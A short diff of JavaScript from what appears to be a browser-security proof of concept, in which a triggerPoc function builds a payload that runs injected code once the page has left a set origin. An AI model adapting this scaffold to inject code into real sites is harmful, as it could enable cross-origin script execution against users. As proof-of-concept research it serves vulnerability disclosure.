@@ -3,8 +3,8 @@
   function triggerPoc(url,code){
     const currUrl = location.href;
     const payload = `
-    console.log("payload-curr: "+currUrl+";payload-loc"+location.href);
-    if(!location.href.startsWith("${currUrl}") && !window.__cloudx){
+    console.log("payload-loc"+location.href);
+    if(!location.href.startsWith("https://renfromabove.github.io") && !window.__cloudx){
       window.__cloudx = true;
       ${code}
     }`;
